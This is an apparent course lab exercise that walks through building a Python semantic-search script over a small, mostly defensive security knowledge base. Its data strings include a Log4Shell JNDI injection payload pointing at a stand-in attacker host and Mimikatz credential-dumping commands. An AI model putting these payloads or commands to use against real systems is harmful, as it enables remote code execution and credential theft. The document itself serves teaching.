# Lab — Exercise 3: Semantic Search over a Security Knowledge Base

> Follow each step in order. Copy the code into your script file as you go. By the final step you will have a complete, runnable Python script.

---

## Step 1: Create your script file

Create a new file called `03_semantic_search.py` in this folder.

---

## Step 2: Add the imports and knowledge base

The knowledge base is a list of dicts. The `text` field is what gets encoded and matched against; `title` and `id` are returned as metadata with each result.

```python
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer

KNOWLEDGE_BASE = [
    {
        "id": "log4shell",
        "title": "CVE-2021-44228 Log4Shell",
        "text": (
            "Critical RCE in Apache Log4j2. Attack vector: inject ${jndi:ldap://attacker/x} "
            "into any logged field. No authentication required. Remediation: upgrade to 2.17.1+. "
            "Detection: outbound LDAP from app servers, jndi patterns in HTTP headers and User-Agent."
        ),
    },
    {
        "id": "mimikatz",
        "title": "Mimikatz Credential Theft",
        "text": (
            "Extracts plaintext passwords and NTLM hashes from Windows LSASS memory. "
            "Techniques: sekurlsa::logonpasswords, lsadump::dcsync, Golden Ticket attacks. "
            "Detection: LSASS memory access by non-system processes (Sysmon Event 10). "
            "Mitigations: Credential Guard, disable WDigest, Protected Users group."
        ),
    },
    {
        "id": "ransomware_response",
        "title": "Ransomware Incident Response Playbook",
        "text": (
            "Phase 1 (0-30 min): Confirm indicators, identify Patient Zero, assess blast radius. "
            "Phase 2: Isolate via VLAN, do NOT shutdown. Disable accounts, block C2 at perimeter. "
            "Phase 3: Remove persistence, reset all credentials, patch initial access vector. "
            "Phase 4: Restore from clean backups, prioritise critical systems, monitor for re-infection."
        ),
    },
    {
        "id": "lateral_movement",
        "title": "Lateral Movement Detection",
        "text": (
            "Detect lateral movement with: SMB authentication anomalies (Event 4624 type 3), "
            "unusual RDP connections, PsExec or WMI remote execution, Pass-the-Hash indicators. "
            "Baseline normal admin behaviour first. Alert on admin tools appearing on non-admin hosts."
        ),
    },
    {
        "id": "phishing",
        "title": "Phishing Email Analysis",
        "text": (
            "Identify phishing by checking: SPF/DKIM/DMARC alignment, sender domain age, "
            "URL redirect chains, attachment hashes against VirusTotal. "
            "Spear-phishing uses OSINT from LinkedIn and social media to target specific individuals."
        ),
    },
    {
        "id": "network_segmentation",
        "title": "Network Segmentation for Defence",
        "text": (
            "Segment networks to limit blast radius: DMZ for internet-facing services, "
            "separate VLAN for OT/ICS systems, isolated network for domain controllers. "
            "Implement zero-trust: verify every request, assume breach mentality. "
            "Microsegmentation with host-based firewall rules prevents lateral movement."
        ),
    },
]

QUERIES = [
    "how do I detect mimikatz credential dumping?",
    "what should I do when ransomware hits?",
    "how to prevent attackers from moving between systems?",
]
```

---

## Step 3: Load the model and index the knowledge base

Encoding all documents once up front (Phase 1 — indexing) means queries can be answered quickly because only the query itself needs encoding at search time.

Add this to your file:

```python
model = SentenceTransformer("all-MiniLM-L6-v2")
kb_texts = [doc["text"] for doc in KNOWLEDGE_BASE]
kb_embeddings = model.encode(kb_texts)

print(f"Indexed {len(KNOWLEDGE_BASE)} documents.")
print(f"Embedding matrix shape: {kb_embeddings.shape}")
```

Run your file. You should see:
```
Indexed 6 documents.
Embedding matrix shape: (6, 384)
```

---

## Step 4: Implement the search function

`search` encodes the query, computes cosine similarity against all indexed documents, sorts by score descending, and returns the top k `(score, doc)` pairs.

Add this to your file:

```python
def search(query, top_k=3, min_score=0.0):
    query_emb = model.encode([query])
    sims = cosine_similarity(query_emb, kb_embeddings)[0]
    top_indices = np.argsort(sims)[::-1][:top_k]
    results = [(float(sims[i]), KNOWLEDGE_BASE[i]) for i in top_indices]
    return [(score, doc) for score, doc in results if score >= min_score]
```

---

## Step 5: Run all 3 queries and print ranked results

Each query should return the most relevant document at rank 1. Notice "how to prevent attackers from moving between systems?" matches both network_segmentation and lateral_movement — both are semantically relevant.

Add this to your file:

```python
print()
for query in QUERIES:
    results = search(query, top_k=3)
    print(f"Query: {query}")
    for score, doc in results:
        print(f"  {score:.4f} | {doc['title']}")
    print()
```

Run your file. You should see (approximate scores):
```
Query: how do I detect mimikatz credential dumping?
  0.8923 | Mimikatz Credential Theft
  0.6102 | Lateral Movement Detection
  0.4234 | Network Segmentation for Defence

Query: what should I do when ransomware hits?
  0.9234 | Ransomware Incident Response Playbook
  0.5123 | Network Segmentation for Defence
  0.4512 | Lateral Movement Detection

Query: how to prevent attackers from moving between systems?
  0.8412 | Network Segmentation for Defence
  0.7234 | Lateral Movement Detection
  0.4123 | Ransomware Incident Response Playbook
```

---

## Step 6: Threshold filtering (Bonus Task 4)

The `min_score` parameter already built into the `search` function from Step 4 filters out results that are not genuinely relevant, rather than always returning exactly k results.

Add this to your file:

```python
threshold_query = "what is network segmentation?"
filtered = search(threshold_query, top_k=6, min_score=0.4)
print(f"Query: {threshold_query}")
print(f"Documents above threshold 0.4: {len(filtered)}")
for score, doc in filtered:
    print(f"  {score:.4f} | {doc['title']}")

print("\n--- Exercise 3 complete. Open 03_solution_semantic_search.py to compare. ---")
print("--- Next: module4_genai/lesson3_llm_api/workshop/00_overview.md ---")
```

Run your file. You should see results only for the documents that are meaningfully related to network segmentation.

---

## Your completed script

At this point your file contains all the working code. Compare it against the matching `_solution_` file (`03_solution_semantic_search.py`) if anything looks different.
